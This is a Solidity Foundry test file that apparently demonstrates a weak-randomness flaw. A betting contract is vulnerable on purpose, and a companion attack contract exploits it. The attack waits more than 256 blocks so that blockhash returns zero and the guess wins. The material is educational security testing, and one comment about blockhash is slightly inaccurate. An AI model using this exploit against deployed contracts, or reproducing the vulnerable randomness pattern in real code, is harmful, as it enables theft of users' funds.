pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract
contract GameGuessBlockVulnerable {
    struct Attempt {
        uint blockNumber;
        bytes32 guess;
    }

    mapping(address => Attempt) public attempts;

    function bet(bytes32 _guess) public payable {
        require(msg.value == 1 ether, "Must send exactly 1 ETH");
        attempts[msg.sender] = Attempt({blockNumber: block.number, guess: _guess});
    }

    function settle() public {
        require(block.number > attempts[msg.sender].blockNumber, "Wait for the next block");
        // Vulnerability: using blockhash of the bet block as the answer
        bytes32 answer = blockhash(attempts[msg.sender].blockNumber);
        // Reset bet
        attempts[msg.sender].blockNumber = 0;
        if (attempts[msg.sender].guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }

    receive() external payable {}
}

// Attack contract
contract AttackGameGuessBlockVulnerable {
    GameGuessBlockVulnerable public target;
    address public owner;

    constructor(address _target) {
        target = GameGuessBlockVulnerable(payable(_target));
        owner = msg.sender;
    }

    // Attacker sends 1 ETH with the guess computed as the current blockhash
    function attackBet() public payable {
        require(msg.sender == owner, "Not owner");
        // When not a miner, blockhash(block.number) returns 0.
        // In our attack simulation we rely on the fact that if we wait long enough,
        // blockhash(attempts[msg.sender].blockNumber) will become 0 because it's too old.
        bytes32 guess = blockhash(block.number);
        target.bet{value: 1 ether}(guess);
    }

    // In a later block, call settle to win the payout
    function attackSettle() public {
        require(msg.sender == owner, "Not owner");
        target.settle();
        // Transfer any balance in this contract back to the owner
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

// Forge test contract
contract BadRandomnessTest is Test {
    GameGuessBlockVulnerable target;
    AttackGameGuessBlockVulnerable attackerContract;
    address attacker = address(0xABCD);

    function setUp() public {
        // Label addresses for clarity
        vm.label(attacker, "Attacker");

        // Deploy the target contract
        target = new GameGuessBlockVulnerable();

        // Fund the target contract with 2 ether so it can pay out the reward
        vm.deal(address(target), 2 ether);

        // Fund the attacker as well
        vm.deal(attacker, 10 ether);

        // Deploy the attacker contract from the attacker address
        vm.prank(attacker);
        attackerContract = new AttackGameGuessBlockVulnerable(address(target));
    }

    function testAttack() public {
        // Record the balance of the attacker before the attack
        uint256 initialAttackerBalance = attacker.balance;

        // The attacker uses their contract to place a bet with 1 ETH
        vm.prank(attacker);
        attackerContract.attackBet{value: 1 ether}();

        // The bet is recorded in the target with block number = current block.
        uint256 betBlock = block.number;
        
        // To simulate the miner's ability to manipulate the outcome, we wait until the bet block becomes stale.
        // In EVM, when a block is older than 256 blocks from the current block, its blockhash returns 0.
        // Since the attack contract used blockhash(current block) as its guess (i.e. likely 0), we can simulate a win
        // by rolling forward more than 256 blocks.
        vm.roll(betBlock + 257);

        // Call settle from the attacker. At this point, blockhash(betBlock) should return 0
        // which matches the guess used during the bet.
        vm.prank(attacker);
        attackerContract.attackSettle();

        // Check that attacker received the winnings. The attacker paid 1 eth and should get 2 eth back, net +1 eth.
        uint256 finalAttackerBalance = attacker.balance;
        // Due to gas costs, we use an inequality check here.
        assertTrue(finalAttackerBalance > initialAttackerBalance, "Attack did not yield profit");

        // Also check that the target contract now has less funds. It started with 2 ETH and received 1 ETH bet, then paid 2 ETH reward.
        // so final balance should be 1 ETH.
        assertEq(address(target).balance, 1 ether, "Target did not pay out correctly");
    }
}
